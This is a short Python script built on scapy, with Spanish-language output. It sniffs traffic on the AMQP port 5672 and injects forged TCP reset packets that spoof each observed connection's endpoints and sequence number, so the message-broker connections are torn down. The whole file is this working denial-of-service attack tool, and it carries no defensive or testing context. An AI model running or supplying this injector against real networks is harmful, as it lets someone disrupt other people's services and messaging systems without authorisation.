#!/usr/bin/env python3
from scapy.all import sniff, send, IP, TCP

IFACE, PUERTO = "ztxooi5ngf", 5672

def reset(pkt):
    ip, tcp = pkt[IP], pkt[TCP]
    if PUERTO not in (tcp.sport, tcp.dport):
        return
    rst = IP(src=ip.src, dst=ip.dst)/TCP(sport=tcp.sport, dport=tcp.dport,
                                         flags="R", seq=tcp.seq)
    send(rst, iface=IFACE, verbose=False)
    print(f"[!] RST inyectado {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} (seq={tcp.seq})")

print("[*] Esperando trafico AMQP para inyectar RST...")
sniff(iface=IFACE, filter=f"tcp port {PUERTO}", prn=reset, store=False, count=6)
